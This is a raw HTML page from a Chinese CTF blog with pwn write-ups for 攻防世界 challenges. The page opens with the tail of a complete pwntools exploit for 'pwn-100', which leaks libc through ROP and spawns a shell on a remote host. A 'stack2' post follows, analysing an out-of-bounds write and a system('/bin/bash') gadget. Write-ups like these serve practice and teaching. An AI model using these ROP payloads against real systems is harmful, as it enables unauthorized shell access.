class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"> #coding&#x3D;utf-8</span><br><span class="line">from pwn import *</span><br><span class="line"> # context.log_level &#x3D; &#39;debug&#39;</span><br><span class="line">io &#x3D; remote(&#39;124.126.19.106&#39;,46612)</span><br><span class="line"> # io &#x3D; process(&quot;.&#x2F;pwn-100&quot;)</span><br><span class="line">elf &#x3D; ELF(&quot;.&#x2F;pwn-100&quot;)</span><br><span class="line">rop1 &#x3D; 0x40075A #pop rbx_rbp_r12_r13_r14_r15</span><br><span class="line">rop2 &#x3D; 0x400740 #rdx(r13), rsi(r14), edi(r15d)</span><br><span class="line">pop_rdi_ret &#x3D; 0x400763</span><br><span class="line"> # start_addr &#x3D; elf.symbols[&#39;_start&#39;]</span><br><span class="line">start_addr &#x3D; 0x400550</span><br><span class="line">puts_plt &#x3D; elf.plt[&#39;puts&#39;]</span><br><span class="line">read_got &#x3D; elf.got[&#39;read&#39;]</span><br><span class="line">binsh_addr &#x3D; 0x601000</span><br><span class="line">def leak(addr):</span><br><span class="line">  payload &#x3D; &quot;a&quot; * 0x48 + p64(pop_rdi_ret) + p64(addr) + p64(puts_plt) + p64(start_addr)</span><br><span class="line">  payload &#x3D; payload.ljust(200, &quot;a&quot;)</span><br><span class="line">  io.send(payload)</span><br><span class="line">  io.recvuntil(&quot;bye~\n&quot;)</span><br><span class="line">  up &#x3D; &quot;&quot;</span><br><span class="line">  content &#x3D; &quot;&quot;</span><br><span class="line">  count &#x3D; 0</span><br><span class="line">  while True:</span><br><span class="line">    c &#x3D; io.recv(numb&#x3D;1, timeout&#x3D;0.5)</span><br><span class="line">    count +&#x3D; 1</span><br><span class="line">    if up &#x3D;&#x3D; &#39;\n&#39; and c &#x3D;&#x3D; &quot;&quot;:</span><br><span class="line">        content &#x3D; content[:-1] + &#39;\x00&#39;</span><br><span class="line">        break</span><br><span class="line">    else:</span><br><span class="line">        content +&#x3D; c</span><br><span class="line">        up &#x3D; c</span><br><span class="line">  content &#x3D; content[:4]</span><br><span class="line">  log.info(&quot;%#x &#x3D;&gt; %s&quot; % (addr, (content or &#39;&#39;).encode(&#39;hex&#39;)))</span><br><span class="line">  return content</span><br><span class="line">d &#x3D; DynELF(leak, elf &#x3D; elf)</span><br><span class="line">sys_addr &#x3D; d.lookup(&#39;system&#39;, &#39;libc&#39;)</span><br><span class="line">log.info(&quot;system_addr &#x3D;&gt; %#x&quot;, sys_addr)</span><br><span class="line">payload  &#x3D; &quot;a&quot; * 0x48 + p64(rop1) + p64(0) + p64(1) + p64(read_got) + p64(8) + p64(binsh_addr) + p64(1)</span><br><span class="line">payload +&#x3D; p64(rop2)</span><br><span class="line">payload +&#x3D; &quot;\x00&quot; * 56  </span><br><span class="line">payload +&#x3D; p64(start_addr)</span><br><span class="line">payload  &#x3D; payload.ljust(200, &quot;a&quot;)</span><br><span class="line">io.send(payload)</span><br><span class="line">io.recvuntil(&quot;bye~\n&quot;)</span><br><span class="line"> # gdb.attach(io)</span><br><span class="line">io.send(&quot;&#x2F;bin&#x2F;sh\x00&quot;)</span><br><span class="line">payload &#x3D; &quot;a&quot; * 0x48 + p64(pop_rdi_ret) + p64(binsh_addr) + p64(sys_addr)</span><br><span class="line">payload &#x3D; payload.ljust(200, &quot;a&quot;)</span><br><span class="line">io.send(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>

      
      
    </div>
    
    <div class="article-info article-info-index">
      
      

      
    <div class="article-tag tagcloud">
        <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/pwn/" rel="tag">pwn</a></li></ul>
    </div>

      
      <div class="clearfix"></div>
    </div>
    
  </div>
  
</article>









  
    <article id="post-攻防世界-pwn-stack2" class="article article-type-post" itemscope itemprop="blogPost">
  
    <div class="article-meta">
      <a href="/2020/10/16/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-pwn-stack2/" class="article-date">
      <time datetime="2020-10-16T04:29:57.435Z" itemprop="datePublished">2020-10-16</time>
</a>
    </div>
  
  <div class="article-inner">
    
      <input type="hidden" class="isFancy" />
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2020/10/16/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-pwn-stack2/">攻防世界-pwn-stack2</a>
    </h1>
  

      </header>
      
    
    <div class="article-entry" itemprop="articleBody">
      
          
        <h2 id="0x01-分析"><a href="#0x01-分析" class="headerlink" title="0x01 分析"></a>0x01 分析</h2><p>checksec检查：</p>
<p><img src="https://i.loli.net/2020/07/27/seUw8f5zIvPk9W7.png" alt="捕获.PNG"></p>
<p>32位，无PIE，开了NX和canary.<br>运行一下是只有五个模块，展示数字，添加，更改，求平均数，退出。</p>
<p>IDA中查看main函数：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><span class="line">int __cdecl main(int argc, const char **argv, const char **envp)</span><br><span class="line">&#123;</span><br><span class="line">  int v3; &#x2F;&#x2F; eax</span><br><span class="line">  unsigned int v5; &#x2F;&#x2F; [esp+18h] [ebp-90h]</span><br><span class="line">  unsigned int v6; &#x2F;&#x2F; [esp+1Ch] [ebp-8Ch]</span><br><span class="line">  int v7; &#x2F;&#x2F; [esp+20h] [ebp-88h]</span><br><span class="line">  unsigned int j; &#x2F;&#x2F; [esp+24h] [ebp-84h]</span><br><span class="line">  int v9; &#x2F;&#x2F; [esp+28h] [ebp-80h]</span><br><span class="line">  unsigned int i; &#x2F;&#x2F; [esp+2Ch] [ebp-7Ch]</span><br><span class="line">  unsigned int k; &#x2F;&#x2F; [esp+30h] [ebp-78h]</span><br><span class="line">  unsigned int l; &#x2F;&#x2F; [esp+34h] [ebp-74h]</span><br><span class="line">  char v13[100]; &#x2F;&#x2F; [esp+38h] [ebp-70h]</span><br><span class="line">  unsigned int v14; &#x2F;&#x2F; [esp+9Ch] [ebp-Ch]</span><br><span class="line">  v14 &#x3D; __readgsdword(0x14u);</span><br><span class="line">  setvbuf(stdin, 0, 2, 0);</span><br><span class="line">  setvbuf(stdout, 0, 2, 0);</span><br><span class="line">  v9 &#x3D; 0;</span><br><span class="line">  puts(&quot;***********************************************************&quot;);</span><br><span class="line">  puts(&quot;*                      An easy calc                       *&quot;);</span><br><span class="line">  puts(&quot;*Give me your numbers and I will return to you an average *&quot;);</span><br><span class="line">  puts(&quot;*(0 &lt;&#x3D; x &lt; 256)                                           *&quot;);</span><br><span class="line">  puts(&quot;***********************************************************&quot;);</span><br><span class="line">  puts(&quot;How many numbers you have:&quot;);</span><br><span class="line">  __isoc99_scanf(&quot;%d&quot;, &amp;v5);</span><br><span class="line">  puts(&quot;Give me your numbers&quot;);</span><br><span class="line">  for ( i &#x3D; 0; i &lt; v5 &amp;&amp; (signed int)i &lt;&#x3D; 0x63; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    __isoc99_scanf(&quot;%d&quot;, &amp;v7);</span><br><span class="line">    v13[i] &#x3D; v7;</span><br><span class="line">  &#125;</span><br><span class="line">  for ( j &#x3D; v5; ; printf(&quot;average is %.2lf\n&quot;, (double)((long double)v9 &#x2F; (double)j)) )</span><br><span class="line">  &#123;</span><br><span class="line">    while ( 1 )</span><br><span class="line">    &#123;</span><br><span class="line">      while ( 1 )</span><br><span class="line">      &#123;</span><br><span class="line">        while ( 1 )</span><br><span class="line">        &#123;</span><br><span class="line">          puts(&quot;1. show numbers\n2. add number\n3. change number\n4. get average\n5. exit&quot;);</span><br><span class="line">          __isoc99_scanf(&quot;%d&quot;, &amp;v6);</span><br><span class="line">          if ( v6 !&#x3D; 2 )</span><br><span class="line">            break;</span><br><span class="line">          puts(&quot;Give me your number&quot;);</span><br><span class="line">          __isoc99_scanf(&quot;%d&quot;, &amp;v7);</span><br><span class="line">          if ( j &lt;&#x3D; 0x63 )</span><br><span class="line">          &#123;</span><br><span class="line">            v3 &#x3D; j++;</span><br><span class="line">            v13[v3] &#x3D; v7;</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        if ( v6 &gt; 2 )</span><br><span class="line">          break;</span><br><span class="line">        if ( v6 !&#x3D; 1 )</span><br><span class="line">          return 0;</span><br><span class="line">        puts(&quot;id\t\tnumber&quot;);</span><br><span class="line">        for ( k &#x3D; 0; k &lt; j; ++k )</span><br><span class="line">          printf(&quot;%d\t\t%d\n&quot;, k, v13[k]);</span><br><span class="line">      &#125;</span><br><span class="line">      if ( v6 !&#x3D; 3 )</span><br><span class="line">        break;</span><br><span class="line">      puts(&quot;which number to change:&quot;);</span><br><span class="line">      __isoc99_scanf(&quot;%d&quot;, &amp;v5);</span><br><span class="line">      puts(&quot;new number:&quot;);</span><br><span class="line">      __isoc99_scanf(&quot;%d&quot;, &amp;v7);</span><br><span class="line">      v13[v5] &#x3D; v7;</span><br><span class="line">    &#125;</span><br><span class="line">    if ( v6 !&#x3D; 4 )</span><br><span class="line">      break;</span><br><span class="line">    v9 &#x3D; 0;</span><br><span class="line">    for ( l &#x3D; 0; l &lt; j; ++l )</span><br><span class="line">      v9 +&#x3D; v13[l];</span><br><span class="line">  &#125;</span><br><span class="line">  return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>发现没有检查v13数组边界，当选择3.change number时程序没有对v5进行检测，存在数组越界，产生溢出：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">puts(&quot;which number to change:&quot;);</span><br><span class="line">     __isoc99_scanf(&quot;%d&quot;, &amp;v5);</span><br><span class="line">     puts(&quot;new number:&quot;);</span><br><span class="line">     __isoc99_scanf(&quot;%d&quot;, &amp;v7);</span><br><span class="line">     v13[v5] &#x3D; v7;</span><br></pre></td></tr></table></figure>

<p>发现给了/bin/bash:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">:0804859B ; __unwind &#123;</span><br><span class="line">.text:0804859B                 push    ebp</span><br><span class="line">.text:0804859C                 mov     ebp, esp</span><br><span class="line">.text:0804859E                 sub     esp, 18h</span><br><span class="line">.text:080485A1                 mov     eax, large gs:14h</span><br><span class="line">.text:080485A7                 mov     [ebp+var_C], eax</span><br><span class="line">.text:080485AA                 xor     eax, eax</span><br><span class="line">.text:080485AC                 sub     esp, 0Ch</span><br><span class="line">.text:080485AF                 push    offset command  ; &quot;&#x2F;bin&#x2F;bash&quot;</span><br><span class="line">.text:080485B4                 call    _system ;system</span><br><span class="line">.text:080485B9                 add     esp, 10h</span><br><span class="line">.text:080485BC                 nop</span><br><span class="line">.text:080485BD                 mov     edx, [ebp+var_C]</span><br><span class="line">.text:080485C0                 xor     edx, large gs:14h</span><br><span class="line">.text:080485C7                 jz      short locret_80485CE</span><br><span class="line">.text:080485C9                 call    ___stack_chk_fail</span><br></pre></td></tr></table></figure>

<p>开启动态调试，在v13[v5]=v7处下断点，</p>
<p><img src="https://i.loli.net/2020/07/31/ClcWPX8p29JHxQk.png" alt="linux输入.PNG"></p>
<p>转到IDA界面，查看此地址，此时edx存入的即为输入的数字9，在栈中的位置是：</p>
<p><img src="https://i.loli.net/2020/07/31/j24baYfNMdlRrGD.png" alt="捕获.PNG"></p>
<p>得到了输入在栈中的位置，找到返回地址的位置覆盖掉就可以了。</p>

      
      
    </div>
    
    <div class="article-info article-info-index">
      
      

      
    <div class="article-tag tagcloud">
        <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/pwn/" rel="tag">pwn</a></li></ul>
    </div>

      
      <div class="clearfix"></div>
    </div>
    
  </div>
  
</article>









  
  
    <nav id="page-nav">
      <span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><a class="page-number" href="/page/3/">3</a><a class="page-number" href="/page/4/">4</a><a class="extend next" rel="next" href="/page/2/">Next &amp;raquo;</a>
    </nav>
  
</div>
      <footer id="footer">
    <div class="outer">
        <div id="footer-info">
            <div class="footer-left">
                &copy; 2020 Sinky-wang
            </div>
            <div class="footer-right">
                <a href="http://hexo.io/" target="_blank">Hexo</a>  Theme <a href="http://Visionaryxx.github.io" target="_blank">Visionary'blog</a> by Visionary
            </div>
        </div>
        
            <div class="visit">
                
                    <span id="busuanzi_container_site_pv" style='display:none'>
                        <span id="site-visit" >海贼到访数: 
                            <span id="busuanzi_value_site_uv"></span>
                        </span>
                    </span>
                
                
                    <span>, </span>
                
                
                    <span id="busuanzi_container_page_pv" style='display:none'>
                        <span id="page-visit">本页阅读量: 
                            <span id="busuanzi_value_page_pv"></span>
                        </span>
                    </span>
                
            </div>
        
    </div>
</footer>

    </div>
    
<script src="https://7.url.cn/edu/jslib/comb/require-2.1.6,jquery-1.9.1.min.js"></script>


<script src="/js/main.js"></script>


    <script>
        $(document).ready(function() {
            var backgroundnum = 24;
            var backgroundimg = "url(/background/bg-x.jpg)".replace(/x/gi, Math.ceil(Math.random() * backgroundnum));
            $("#mobile-nav").css({"background-image": backgroundimg,"background-size": "cover","background-position": "center"});
            $(".left-col").css({"background-image": backgroundimg,"background-size": "cover","background-position": "center"});
        })
    </script>





<div class="scroll" id="scroll">
    <a href="#"><i class="fa fa-arrow-up"></i></a>
    <a href="#comments"><i class="fa fa-comments-o"></i></a>
    <a href="#footer"><i class="fa fa-arrow-down"></i></a>
</div>
<script>
    $(document).ready(function() {
        if ($("#comments").length < 1) {
            $("#scroll > a:nth-child(2)").hide();
        };
    })
</script>

<script async src="https://dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js">
</script>

  <script language="javascript">
    $(function() {
        $("a[title]").each(function() {
            var a = $(this);
            var title = a.attr('title');
            if (title == undefined || title == "") return;
            a.data('title', title).removeAttr('title').hover(

            function() {
                var offset = a.offset();
                $("<div id=\"anchortitlecontainer\"></div>").appendTo($("body")).html(title).css({
                    top: offset.top - a.outerHeight() - 15,
                    left: offset.left + a.outerWidth()/2 + 1
                }).fadeIn(function() {
                    var pop = $(this);
                    setTimeout(function() {
                        pop.remove();
                    }, pop.text().length * 800);
                });
            }, function() {
                $("#anchortitlecontainer").remove();
            });
        });
    });
</script>


    <script type="text/javascript">
      window.onload = function(){
        document.getElementById("search").onclick = function(){
            console.log("search")
            search();
        }
      }
      function search(){
        (function(w,d,t,u,n,s,e){w['SwiftypeObject']=n;w[n]=w[n]||function(){
        (w[n].q=w[n].q||[]).push(arguments);};s=d.createElement(t);
        e=d.getElementsByTagName(t)[0];s.async=1;s.src=u;e.parentNode.insertBefore(s,e);
        })(window,document,'script','//s.swiftypecdn.com/install/v2/st.js','_st');

        _st('install','A1Pz-LKMXbrzcFg2FWi6','2.0.0');
      }
    </script>

  </div>
</body>
</html>